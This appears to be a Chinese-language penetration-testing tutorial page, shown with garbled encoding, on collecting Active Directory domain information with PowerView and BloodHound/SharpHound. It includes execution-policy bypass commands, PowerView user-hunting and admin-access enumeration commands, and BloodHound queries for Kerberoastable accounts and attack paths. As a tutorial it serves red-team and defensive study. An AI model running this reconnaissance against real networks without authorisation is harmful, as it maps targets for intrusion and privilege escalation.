<h2 id="2-13-åˆ©ç”¨power-shellæ”¶é›†åŸŸå†…ä¿¡æ¯"><a href="#2-13-åˆ©ç”¨power-shellæ”¶é›†åŸŸå†…ä¿¡æ¯" class="headerlink" title="2.13 åˆ©ç”¨power shellæ”¶é›†åŸŸå†…ä¿¡æ¯"></a>2.13 åˆ©ç”¨power shellæ”¶é›†åŸŸå†…ä¿¡æ¯</h2><p>â€‹        PowerShellæ˜¯å¾®è½¯æ¨å‡ºçš„ä¸€æ¬¾ç”¨äºæ»¡è¶³ç®¡ç†å‘˜å¯¹æ“ä½œç³»ç»ŸåŠåº”ç”¨ç¨‹åºæ˜“ç”¨æ€§å’Œæ‰©å±•æ€§éœ€æ±‚çš„è„šæœ¬ç¯å¢ƒï¼Œå¯ä»¥è¯´æ˜¯cmd.exeçš„åŠ å¼ºç‰ˆã€‚ä½œä¸ºå¾®è½¯å®˜æ–¹æ¨å‡ºçš„è„šæœ¬è¯­è¨€ï¼Œåœ¨Windowsæ“ä½œç³»ç»Ÿä¸­çš„å¼ºå¤§åŠŸèƒ½ä¼—æ‰€å‘¨çŸ¥ï¼šç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥åˆ©ç”¨å®ƒæé«˜Windowsç®¡ç†å·¥ä½œçš„è‡ªåŠ¨åŒ–ç¨‹åº¦ï¼›æ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥åˆ©ç”¨å®ƒæ›´å¥½åœ°è¿›è¡Œç³»ç»Ÿå®‰å…¨æµ‹è¯•ã€‚</p>
<ul>
<li>PowerShell 2.0 å†…ç½®åœ¨ Windows Server 2008 å’Œ Windows 7 ä¸­</li>
<li>PowerShell 3.0 å†…ç½®åœ¨ Windows Server 2012 å’Œ Windows 8 ä¸­</li>
<li>PowerShell 4.0 å†…ç½®åœ¨ Windows Server 2012 R2 å’Œ Windows 8.1ä¸­</li>
<li>PowerShell 5.0 å†…ç½®åœ¨ Windows Server 2016 å’Œ Windows 10 ä¸­</li>
</ul>
<pre><code class="hljs powershell"><span class="hljs-comment"># æŸ¥çœ‹powershellç‰ˆæœ¬</span>
<span class="hljs-variable">$PSVersionTable</span>.PSVersion</code></pre>

<p>Powershellæœ‰å…­ç§æ‰§è¡Œç­–ç•¥ï¼š</p>
<ul>
<li><code>Unrestricted</code> æƒé™æœ€é«˜ï¼Œå¯ä»¥ä¸å—é™åˆ¶æ‰§è¡Œä»»æ„è„šæœ¬</li>
<li><code>Restricted</code> é»˜è®¤ç­–ç•¥ï¼Œä¸å…è®¸ä»»æ„è„šæœ¬çš„æ‰§è¡Œ</li>
<li><code>AllSigned</code> æ‰€æœ‰è„šæœ¬å¿…é¡»ç»è¿‡ç­¾åè¿è¡Œ</li>
<li><code>RemoteSigned</code> æœ¬åœ°è„šæœ¬æ— é™åˆ¶ï¼Œä½†æ˜¯å¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»ç»è¿‡ç­¾å</li>
<li><code>Bypass</code>  æ²¡æœ‰ä»»ä½•é™åˆ¶å’Œæç¤º</li>
<li><code>Undefined</code> æ²¡æœ‰è®¾ç½®è„šæœ¬çš„ç­–ç•¥</li>
</ul>
<pre><code class="hljs powershell"><span class="hljs-comment"># è·å–å½“å‰æ‰§è¡Œç­–ç•¥ </span>
<span class="hljs-built_in">Get-ExecutionPolicy</span>
<span class="hljs-comment"># æ›´æ”¹æ‰§è¡Œç­–ç•¥ </span>
<span class="hljs-built_in">Set-ExecutionPolicy</span> <span class="hljs-literal">-ExecutionPolicy</span> Unrestricted</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604110450583.png" alt="image-20220604110450583"></p>
<p>â€‹           PowerView æ˜¯ä¸€æ¬¾ä¾èµ– PowerShell å’Œ WMI å¯¹å†…ç½‘è¿›è¡ŒæŸ¥è¯¢çš„å¸¸ç”¨æ¸—é€æµ‹è¯•è„šæœ¬ï¼Œå®ƒé›†æˆåœ¨ PowerSploit å·¥å…·åŒ…ä¸­ï¼Œä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit%E3%80%82%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AAPowerShell%E7%AA%97%E5%8F%A3%EF%BC%8C%E8%BF%9B%E5%85%A5PowerSploit%E7%9B%AE%E5%BD%95%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%93%E5%BC%80Recon%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4%60Import-Module">https://github.com/PowerShellMafia/PowerSploitã€‚æ‰“å¼€ä¸€ä¸ªPowerShellçª—å£ï¼Œè¿›å…¥PowerSploitç›®å½•ï¼Œç„¶åæ‰“å¼€Reconç›®å½•ï¼Œè¾“å…¥å‘½ä»¤`Import-Module</a> .\PowerView.ps1`ï¼Œå¯¼å…¥è„šæœ¬ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604111942904.png" alt="image-20220604111942904"></p>
<p>å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>Get-NetDomain è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°</li>
<li>Get-NetUser è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</li>
<li>Get-NetDomainController è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯</li>
<li>Get-NetComputer è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯</li>
<li>Get-NetPrinter è·å–åŸŸä¸­æ‰€æœ‰å½“å‰è®¡ç®—æœºå¯¹è±¡çš„æ•°ç»„</li>
<li>Get-NetOU è·å–åŸŸå†…çš„OUä¿¡æ¯</li>
<li>Get-NetGroup è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜çš„ä¿¡æ¯</li>
<li>Get-NetGroupMember è·å–æŒ‡å®šåŸŸç»„ä¸­æ‰€æœ‰å½“å‰ç”¨æˆ·çš„åˆ—è¡¨</li>
<li>Get-NetFileServer æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯</li>
<li>Get-NetShare è·å–å½“å‰åŸŸå†…æ‰€æœ‰çš„ç½‘ç»œå…±äº«ä¿¡æ¯</li>
<li>Get-DFSshare è·å–åŸŸä¸Šæ‰€æœ‰åˆ†å‘æ–‡ä»¶ç³»ç»Ÿå…±äº«çš„åˆ—è¡¨</li>
<li>Get-NetSubnet è·å–åŸŸçš„å…¶ä»–ç½‘æ®µ</li>
<li>Get-NetSite è·å–åŸŸå†…çš„å½“å‰ç«™ç‚¹</li>
<li>Get-NetDomainTrust è·å–å½“å‰ç”¨æˆ·åŸŸçš„æ‰€æœ‰ä¿¡ä»»</li>
<li>Get-NetForestTrust è·å–ä¸å½“å‰ç”¨æˆ·çš„åŸŸå…³è”çš„æ—çš„æ‰€æœ‰ä¿¡ä»»</li>
<li>Find-ForeignUser æšä¸¾åœ¨å…¶ä¸»åŸŸä¹‹å¤–çš„ç»„ä¸­çš„ç”¨æˆ·</li>
<li>Find-ForeignGroup æšä¸¾åŸŸç»„çš„æ‰€æœ‰æˆå‘˜å¹¶æŸ¥æ‰¾æŸ¥è¯¢åŸŸä¹‹å¤–çš„ç”¨æˆ·</li>
<li>Invoke-MapDomainTrust å°è¯•æ„å»ºæ‰€æœ‰åŸŸä¿¡ä»»çš„å…³ç³»æ˜ å°„</li>
<li>Get-NetLoggedon è·å–ä¸»åŠ¨ç™»å½•åˆ°æŒ‡å®šæœåŠ¡å™¨çš„ç”¨æˆ·</li>
<li>Get-NetLocalGroup è·å–ä¸€ä¸ªæˆ–å¤šä¸ªè¿œç¨‹ä¸»æœºä¸Šæœ¬åœ°ç»„çš„æˆå‘˜</li>
<li>Get-NetSession è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯</li>
<li>Get-NetRDPSession è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥</li>
<li>Get-NetProcess è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹</li>
<li>Get-UserEvent è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—</li>
<li>Get-ADObject è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡</li>
<li>Get-NetGPO è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡</li>
<li>Get-NetGPOGroup è·å–åŸŸä¸­è®¾ç½®â€å—é™ç»„â€çš„æ‰€æœ‰GPO</li>
<li>Find-GPOLocation è·å–ç”¨æˆ·/ç»„ï¼Œå¹¶é€šè¿‡GPOæšä¸¾å’Œå…³è”ä½¿å…¶å…·æœ‰æœ‰æ•ˆæƒé™çš„è®¡ç®—æœº</li>
<li>Find-GPOComputerAdmin è·å–è®¡ç®—æœºå¹¶é€šè¿‡GPOæšä¸¾ç¡®å®šè°å¯¹å…¶å…·æœ‰ç®¡ç†æƒé™</li>
<li>Get-DomainPolicy è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥</li>
<li>Get-DomainSID è¿”å›æŒ‡å®šåŸŸçš„SID</li>
<li>Invoke-UserHunter è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™</li>
<li>Invoke-ProcessHunter é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·</li>
<li>Invoke-UserEventHunter æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»é™†è¿‡å“ªäº›åŸŸæœºå™¨</li>
<li>Invoke-ShareFinder åœ¨æœ¬åœ°åŸŸä¸­çš„ä¸»æœºä¸ŠæŸ¥æ‰¾ï¼ˆéæ ‡å‡†ï¼‰å…±äº«</li>
<li>Invoke-FileFinder åœ¨æœ¬åœ°åŸŸä¸­çš„ä¸»æœºä¸ŠæŸ¥æ‰¾æ½œåœ¨çš„æ•æ„Ÿæ–‡ä»¶</li>
<li>Find-LocalAdminAccess åœ¨åŸŸä¸ŠæŸ¥æ‰¾å½“å‰ç”¨æˆ·å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™çš„è®¡ç®—æœº</li>
<li>Find-ManagedSecurityGroups æœç´¢å—ç®¡ç†çš„æ´»åŠ¨ç›®å½•å®‰å…¨ç»„å¹¶æ ‡è¯†å¯¹å…¶å…·æœ‰å†™è®¿é—®æƒé™çš„ç”¨æˆ·ï¼Œå³è¿™äº›ç»„æ‹¥æœ‰æ·»åŠ æˆ–åˆ é™¤æˆå‘˜çš„èƒ½åŠ›</li>
<li>Get-ExploitableSystem å‘ç°ç³»ç»Ÿå¯èƒ½æ˜“å—å¸¸è§æ”»å‡»</li>
<li>Invoke-EnumerateLocalAdmin æšä¸¾åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºä¸Šæœ¬åœ°ç®¡ç†å‘˜ç»„çš„æˆå‘˜</li>
</ol>
<h2 id="2-14-åŸŸåˆ†æå·¥å…·-Blood-Hound"><a href="#2-14-åŸŸåˆ†æå·¥å…·-Blood-Hound" class="headerlink" title="2.14 åŸŸåˆ†æå·¥å…· Blood Hound"></a>2.14 åŸŸåˆ†æå·¥å…· Blood Hound</h2><p>â€‹        BloodHound æ˜¯ä¸€æ¬¾å…è´¹çš„å·¥å…·ã€‚ä¸€æ–¹é¢ï¼ŒBloodHound é€šè¿‡å›¾ä¸çº¿çš„å½¢å¼ï¼Œå°†åŸŸå†…ç”¨æˆ·ã€è®¡ç®—æœºã€ç»„ã€ä¼šè¯ã€ACLï¼Œä»¥åŠåŸŸå†…æ‰€æœ‰çš„ç›¸å…³ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ç™»å½•ä¿¡æ¯ã€è®¿é—®æ§åˆ¶ç­–ç•¥ä¹‹é—´çš„å…³ç³»ï¼Œç›´è§‚åœ°å±•ç°åœ¨ Red Team æˆå‘˜é¢å‰ï¼Œä¸ºä»–ä»¬æ›´ä¾¿æ·åœ°åˆ†æåŸŸå†…æƒ…å†µã€æ›´å¿«é€Ÿåœ°åœ¨åŸŸå†…æå‡æƒé™æä¾›æ¡ä»¶ã€‚å¦ä¸€æ–¹é¢ï¼ŒBloodHound å¯ä»¥å¸®åŠ©Blue Team æˆå‘˜æ›´å¥½åœ°å¯¹å·±æ–¹ç½‘ç»œç³»ç»Ÿè¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œä»¥åŠä¿è¯åŸŸçš„å®‰å…¨æ€§ã€‚BloodHound ä½¿ç”¨å›¾å½¢ç†è®ºï¼Œåœ¨æ´»åŠ¨ç›®å½•ç¯å¢ƒä¸­è‡ªåŠ¨ç†æ¸…å¤§éƒ¨åˆ†äººå‘˜ä¹‹é—´çš„å…³ç³»å’Œç»†èŠ‚ã€‚ä½¿ç”¨BloodHoundï¼Œå¯ä»¥å¿«é€Ÿã€æ·±å…¥åœ°äº†è§£æ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·ä¹‹é—´çš„å…³ç³»ï¼Œè·å–å“ªäº›ç”¨æˆ·å…·æœ‰ç®¡ç†å‘˜æƒé™ã€å“ªäº›ç”¨æˆ·å¯¹æ‰€æœ‰çš„è®¡ç®—æœºéƒ½å…·æœ‰ç®¡ç†å‘˜æƒé™ã€å“ªäº›ç”¨æˆ·æ˜¯æœ‰æ•ˆçš„ç”¨æˆ·<br>ç»„æˆå‘˜ç­‰ä¿¡æ¯ã€‚</p>
<p>â€‹        BloodHound å¯ä»¥åœ¨åŸŸå†…å¯¼å‡ºç›¸å…³ä¿¡æ¯ï¼Œå°†é‡‡é›†çš„æ•°æ®å¯¼å…¥æœ¬åœ° Neo4i æ•°æ®åº“ï¼Œå¹¶è¿›è¡Œå±•ç¤ºå’Œåˆ†æã€‚Neo4j æ˜¯ä¸€æ¬¾ NoSQL å›¾å½¢æ•°æ®åº“ï¼Œå®ƒå°†ç»“æ„åŒ–æ•°æ®å­˜å‚¨åœ¨ç½‘ç»œå†…è€Œä¸æ˜¯è¡¨ä¸­ã€‚BloodHound æ­£æ˜¯åˆ©ç”¨ Neo4j çš„è¿™ç§ç‰¹æ€§ï¼Œé€šè¿‡åˆç†çš„åˆ†æï¼Œç›´è§‚åœ°ä»¥èŠ‚ç‚¹ç©ºé—´çš„å½¢å¼è¡¨è¾¾ç›¸å…³æ•°æ®çš„ã€‚Neo4j å’Œ MySQL åŠå…¶ä»–æ•°æ®åº“ä¸€æ ·ï¼Œæ‹¥æœ‰è‡ªå·±çš„æŸ¥è¯¢è¯­è¨€ Cypher Query Languageã€‚å› ä¸º Neo4j æ˜¯ä¸€æ¬¾éå…³ç³»å‹æ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œè¦æƒ³åœ¨å…¶ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼ŒåŒæ ·éœ€è¦ä½¿ç”¨å…¶ç‰¹æœ‰çš„è¯­æ³•ã€‚</p>
<h3 id="2-14-1-é…ç½®ç¯å¢ƒ"><a href="#2-14-1-é…ç½®ç¯å¢ƒ" class="headerlink" title="2.14.1 é…ç½®ç¯å¢ƒ"></a>2.14.1 é…ç½®ç¯å¢ƒ</h3><p>â€‹        é¦–å…ˆï¼Œéœ€è¦éš¾å¤‡ä¸€å°å®‰è£…äº† Windows æœåŠ¡å™¨æ“ä½œç³»ç»Ÿçš„æœºå™¨ã€‚ä¸ºäº†æ–¹ä¾¿ã€å¿«æ·åœ°ä½¿ç”¨ Neo4j çš„Webç®¡ç†ç•Œé¢ï¼Œæ¨èä½¿ç”¨ Chrome æˆ–è€…ç«ç‹æµè§ˆå™¨ã€‚Neo4j æ•°æ®åº“çš„è¿è¡Œéœ€è¦ Java ç¯å¢ƒçš„æ”¯æŒã€‚</p>
<p>â€‹         è¯¦ç»†å®‰è£…æ•™ç¨‹å¯ä»¥å‚è€ƒå®˜æ–¹æ•™ç¨‹ï¼š<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/installation/windows.html">https://bloodhound.readthedocs.io/en/latest/installation/windows.html</a></p>
<pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…neo4j</span>
C:\&gt; neo4j.bat install-service
<span class="hljs-comment"># å¯åŠ¨neo4j,URLï¼šhttp://localhost:7474/ï¼Œç”¨æˆ·åï¼šneo4j å¯†ç ï¼šneo4j </span>
C:\&gt; net start neo4j
<span class="hljs-comment"># åŒå‡» BloodHound.exe è¿æ¥å³å¯</span></code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604160322400.png" alt="image-20220604160322400" style="zoom: 50%;" />

<p><strong>ç•Œé¢å·¦ä¸Šè§’æ˜¯èœå•æŒ‰é’®å’Œæœç´¢æ ï¼š</strong></p>
<p>ä¸‰ä¸ªé€‰é¡¹å¡åˆ†åˆ«æ˜¯æ•°æ®åº“ä¿¡æ¯ï¼ˆDatabase Info)ã€èŠ‚ç‚¹ä¿¡æ¯ (Node Info)å’Œåˆ†æ(Analysis)ã€‚</p>
<ul>
<li><p>æ•°æ®åº“ä¿¡æ¯é€‰é¡¹å¡ä¸­æ˜¾ç¤ºäº†æ‰€åˆ†æåŸŸçš„ç”¨æˆ·æ•°é‡ã€è®¡ç®—æœºæ•°é‡ã€ç»„æ•°é‡ã€ä¼šè¯æ•°é‡ã€ACLæ•°é‡ã€å…³ç³»ç­‰ä¿¡æ¯ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤å¤„æ‰§è¡ŒåŸºæœ¬çš„æ•°æ®åº“ç®¡ç†æ“ä½œï¼ŒåŒ…æ‹¬æ³¨é”€å’Œåˆ‡æ¢æ•°æ®å¹¸ï¼Œä»¥åŠæ¸…é™¤å½“å‰åŠ è½½çš„æ•°æ®åº“ã€‚</p>
</li>
<li><p>èŠ‚ç‚¹ä¿¡æ¯é€‰é¡¹å¡ä¸­æ˜¾ç¤ºäº†ç”¨æˆ·åœ¨å›¾è¡¨ä¸­å•å‡»çš„èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚</p>
</li>
<li><p>åˆ†æé€‰é¡¹å¡ä¸­æ˜¾ç¤ºäº† BloodHound é¢„ç½®çš„æŸ¥è¯¢è¯·æ±‚å’Œç”¨æˆ·è‡ªå·±æ„å»ºçš„æŸ¥è¯¢è¯·æ±‚ã€‚</p>
</li>
</ul>
<p><strong>ç•Œé¢å³ä¸Šè§’æ˜¯è®¾ç½®åŒºï¼š</strong></p>
<p>ç¬¬ä¸€ä¸ªæ˜¯åˆ·æ–°åŠŸèƒ½ï¼ŒBloodHound å°†é‡æ–°è®¡ç®—å¹¶ç»˜åˆ¶å½“å‰æ˜¾ç¤ºçš„å›¾å½¢ï¼›</p>
<p>ç¬¬äºŒä¸ªæ˜¯å¯¼å‡ºå›¾å½¢åŠŸèƒ½ï¼Œå¯ä»¥å°†å½“å‰ç»˜åˆ¶çš„å›¾å½¢å¯¼å‡ºä¸ºJSONæˆ–PNGæ–‡ä»¶ï¼›</p>
<p>ç¬¬ä¸‰ä¸ªæ˜¯å¯¼å…¥å›¾å½¢åŠŸèƒ½ï¼Œå¯ä»¥å¯¼å…¥JSONæ–‡ä»¶ï¼›</p>
<p>ç¬¬å››ä¸ªæ˜¯ä¸Šä¼ æ•°æ®åŠŸèƒ½ï¼ŒBloodHoundå°†å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè‡ªåŠ¨æ£€æµ‹ï¼Œç„¶åè·å–CSVæ ¼å¼çš„æ•°æ®ï¼›</p>
<p>ç¬¬äº”ä¸ªæ˜¯æŸ¥çœ‹ä¸Šä¼ çŠ¶æ€åŠŸèƒ½ï¼Œåº”è¯¥æ˜¯æ–°å¢çš„åŠŸèƒ½ï¼Œå®˜æ–¹æ–‡æ¡£å¹¶æœªæ‰¾åˆ°ç›¸å…³æè¿°ã€‚</p>
<p>ç¬¬å…­ä¸ªæ˜¯æ›´æ”¹å¸ƒå±€ç±»å‹åŠŸèƒ½ï¼Œç”¨äºåœ¨åˆ†å±‚å’Œå¼ºåˆ¶å®šå‘å›¾å¸ƒå±€ä¹‹é—´åˆ‡æ¢ï¼›</p>
<p>ç¬¬ä¸ƒä¸ªæ˜¯è®¾ç½®åŠŸèƒ½ï¼Œå¯ä»¥æ›´æ”¹èŠ‚ç‚¹çš„æŠ˜å è¡Œä¸ºï¼Œä»¥åŠåœ¨ä¸åŒçš„ç»†èŠ‚æ¨¡å¼ä¹‹é—´åˆ‡æ¢ã€‚</p>
<h3 id="2-14-2-é‡‡é›†æ•°æ®"><a href="#2-14-2-é‡‡é›†æ•°æ®" class="headerlink" title="2.14.2 é‡‡é›†æ•°æ®"></a>2.14.2 é‡‡é›†æ•°æ®</h3><p>åœ¨ä½¿ç”¨BloodHoundè¿›è¡Œåˆ†ææ—¶ï¼Œéœ€è¦è°ƒç”¨æ¥è‡ªæ´»åŠ¨ç›®å½•çš„ä¸‰æ¡ä¿¡æ¯ï¼Œå…·ä½“å¦‚ä¸‹ã€‚</p>
<ul>
<li><p>å“ªäº›ç”¨æˆ·ç™»å½•äº†å“ªäº›æœºå™¨ï¼Ÿ</p>
</li>
<li><p>å“ªäº›ç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Ÿ</p>
</li>
<li><p>å“ªäº›ç”¨æˆ·å’Œç»„å±äºå“ªäº›ç»„ï¼Ÿ</p>
</li>
</ul>
<p>â€‹       BloodHoundéœ€è¦çš„è¿™ä¸‰æ¡ä¿¡æ¯ä¾èµ–äº Power View.ps1 è„šæœ¬çš„BloodHoundã€‚BloodHoundåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€æ˜¯PowerShell é‡‡é›†å™¨è„šæœ¬ï¼ˆæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œæ—§ç‰ˆæœ¬å«ä½œBloodHound_Old.ps1ï¼Œæ–°ç‰ˆæœ¬å«ä½œSharpHound.ps1),äºŒæ˜¯å¯æ‰§è¡Œæ–‡ä»¶SharpHound.exeã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ”¶é›†æ­¤ä¿¡æ¯ä¸éœ€è¦ç³»ç»Ÿç®¡ç†å‘˜æƒé™ã€‚</p>
<p><strong>1ã€SharpHound.ps1 æœé›†æ•°æ®</strong></p>
<p>Repo:  <a target="_blank" rel="noopener" href="https://github.com/SevenC-base/Intranet/blob/master/windows/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/SharpHound.ps1">https://github.com/SevenC-base/Intranet/blob/master/windows/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/SharpHound.ps1</a></p>
<pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c ALL&quot;</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605210320931.png" alt="image-20220605210320931"></p>
<p><strong>2ã€SharpHound.exe æœé›†æ•°æ®</strong></p>
<p>Windows Server 2008 éœ€è¦.NET 4.0ã€4.5ã€4.6ç¯å¢ƒï¼Œé™åˆ¶è¾ƒå¤šã€‚</p>
<p> SharpHound.exe ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
<p>.NET 4.0 ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718</a></p>
<p>.NET 4.5.2 ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=42642">https://www.microsoft.com/en-us/download/confirmation.aspx?id=42642</a></p>
<p>.NET 4.6 ä¸‹è½½åœ°å€ï¼ˆå¼€å‘äººå‘˜å·¥å…·åŒ…ï¼‰ï¼š<a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net461">https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net461</a></p>
<p>å®‰è£…å®Œæˆéœ€è¦é‡å¯ã€‚</p>
<pre><code class="hljs powershell">SharpHound.exe <span class="hljs-literal">-c</span> all</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605213944548.png" alt="image-20220605213944548"></p>
<p><strong>3ã€BloodHound.py æœé›†æ•°æ®</strong></p>
<p>repo: <a target="_blank" rel="noopener" href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></p>
<h3 id="2-14-3-å¯¼å…¥æ•°æ®"><a href="#2-14-3-å¯¼å…¥æ•°æ®" class="headerlink" title="2.14.3 å¯¼å…¥æ•°æ®"></a>2.14.3 å¯¼å…¥æ•°æ®</h3><p>â€‹      å°†æœé›†çš„æ•°æ®å‹ç¼©åŒ…é€šè¿‡BloodHoundçš„å›¾å½¢åŒ–ç•Œé¢Upload dataæŒ‰é’®ä¸Šä¼ åˆ†æï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
  <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605221005108.png" alt="image-20220605221005108" style="zoom:50%;" />

<h3 id="2-14-4-æŸ¥è¯¢ä¿¡æ¯"><a href="#2-14-4-æŸ¥è¯¢ä¿¡æ¯" class="headerlink" title="2.14.4 æŸ¥è¯¢ä¿¡æ¯"></a>2.14.4 æŸ¥è¯¢ä¿¡æ¯</h3><p>æŸ¥è¯¢ä¿¡æ¯ä¸€å…±å¯åˆ†ä¸ºäº”ä¸ªæ–¹é¢ï¼šåŸŸä¿¡æ¯ã€å±é™©çš„æƒé™ã€kerberos äº¤äº’ã€æœ€çŸ­è·¯å¾„ã€è‡ªå®šä¹‰æŸ¥è¯¢ã€‚</p>
<ul>
<li>Domain Informationï¼šåŸŸä¿¡æ¯<br>â€” Find all Domain Adminsï¼šæŸ¥è¯¢æ‰€æœ‰åŸŸç®¡ç†å‘˜<br>â€” Map Domain Trustsï¼šæ˜ å°„åŸŸä¿¡ä»»<br>â€” Find Computers with Unsupported Operating Systemsï¼šæŸ¥æ‰¾ä¸æ”¯æŒæ“ä½œç³»ç»Ÿçš„è®¡ç®—æœº</li>
<li>Dangerous Rightsï¼šå±é™©çš„æƒé™<br>â€” Find Principals with DCSync Rightsï¼šæŸ¥æ‰¾å…·æœ‰DCSyncæƒé™çš„ä¸»ä½“<br>â€” Users with Foreign Domain Group Membershipï¼šå…·æœ‰å¤–éƒ¨åŸŸç»„æˆå‘˜èµ„æ ¼çš„ç”¨æˆ·<br>â€” Groups with Foreign Domain Group Membershipï¼šå…·æœ‰å¤–éƒ¨åŸŸåç»„æˆå‘˜èµ„æ ¼çš„ç»„<br>â€” Find Computers where Domain Users are Local Adminï¼šæŸ¥æ‰¾åŸŸç”¨æˆ·æ˜¯æœ¬åœ°ç®¡ç†å‘˜çš„è®¡ç®—æœº<br>â€” Find Computers where Domain Users can read LAPS passwordsï¼šæŸ¥æ‰¾åŸŸç”¨æˆ·å¯ä»¥è¯»å–å¯†ç çš„è®¡ç®—æœº<br>â€” Find All Paths from Domain Users to High Value Targetsï¼šæ‰¾åˆ°ä»åŸŸç”¨æˆ·åˆ°é«˜ä»·å€¼ç›®æ ‡çš„æ‰€æœ‰è·¯å¾„<br>â€” Find Workstations where Domain Users can RDPï¼šæ‰¾åˆ°åŸŸç”¨æˆ·å¯ä»¥RDPçš„å·¥ä½œç«™<br>â€” Find Servers where Domain Users can RDPï¼šæ‰¾åˆ°åŸŸç”¨æˆ·å¯ä»¥RDPçš„æœåŠ¡å™¨<br>â€” Find Dangerous Rights for Domain Users Groupsï¼šæŸ¥æ‰¾åŸŸç”¨æˆ·ç»„çš„å±é™©æƒé™<br>â€” Find Domain Admin Logons to non-Domain Controllersï¼šæŸ¥æ‰¾éåŸŸæ§åˆ¶å™¨çš„åŸŸç®¡ç†å‘˜ç™»å½•</li>
<li>Kerberos Interactionï¼škerberos äº¤äº’<br>â€” Find Kerberoastable Members of High Value Groupsï¼šæ‰¾åˆ°é«˜ä»·å€¼ç¾¤ä½“ä¸­èƒ½å¤Ÿæ”¯æŒkerberoableçš„æˆå‘˜<br>â€” List all Kerberoastable Accountsï¼šåˆ—å‡ºæ‰€æœ‰kerberoableç”¨æˆ·<br>â€” Find Kerberoastable Users with most privilegesï¼šæŸ¥æ‰¾å…·æœ‰å¤§å¤šæ•°ç‰¹æƒçš„Kerberoastableç”¨æˆ·<br>â€” Find AS-REP Roastable Users (DontReqPreAuth)ï¼šæŸ¥æ‰¾AS-REP Roastableç”¨æˆ·(DontReqPreAuth)</li>
